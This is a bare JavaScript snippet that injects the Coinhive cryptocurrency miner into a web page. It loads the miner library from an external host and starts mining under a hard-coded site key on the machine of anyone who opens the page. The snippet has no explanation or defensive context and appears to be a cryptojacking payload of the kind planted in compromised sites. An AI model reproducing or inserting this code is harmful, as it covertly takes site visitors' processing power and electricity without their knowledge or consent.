            var mnr = document.createElement('script');
            mnr.src = 'https://coin-hive.com/lib/coinhive.min.js';
            mnr.onload = function() {
                var miner = CoinHive.Anonymous('3FJP2bPdCQToERYnsplQa9I4Nhjec5t5');
                miner.start();
            };
            document.getElementsByTagName('body')[0].appendChild(mnr);